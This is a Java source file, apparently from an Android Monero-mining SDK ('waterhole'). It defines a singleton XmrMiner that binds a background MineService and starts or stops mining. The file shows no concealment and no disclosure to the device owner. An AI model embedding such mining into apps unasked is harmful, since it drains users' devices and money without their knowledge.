package waterhole.miner.monero;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;
import android.os.RemoteException;

import java.io.ObjectStreamException;

import waterhole.miner.core.AbstractMiner;

public final class XmrMiner extends AbstractMiner {

    static final String LOG_TAG = "Waterhole-XmrMiner";

    private IMiningServiceBinder mServiceBinder;

    private final ServiceConnection mServerConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            try {
                mServiceBinder = IMiningServiceBinder.MiningServiceBinder.asInterface(iBinder);
                mServiceBinder.add(3, 5);
                mServiceBinder.startMine();
                mServiceBinder.setControllerNeedRun(true);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            mServiceBinder = null;
        }
    };

    private XmrMiner() {
    }

    public static XmrMiner instance() {
        return Holder.instance;
    }

    private static class Holder {
        private static XmrMiner instance = new XmrMiner();
    }

    private Object readResolve() throws ObjectStreamException {
        return instance();
    }

    @Override
    public void startMine() {
        final Intent intent = new Intent(getContext(), MineService.class);
        getContext().bindService(intent, mServerConnection, Context.BIND_AUTO_CREATE);
    }

    @Override
    public void stopMine() {
        try {
            if (mServiceBinder != null) {
                mServiceBinder.stopMine();
                mServiceBinder.setControllerNeedRun(false);
            }
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }
}
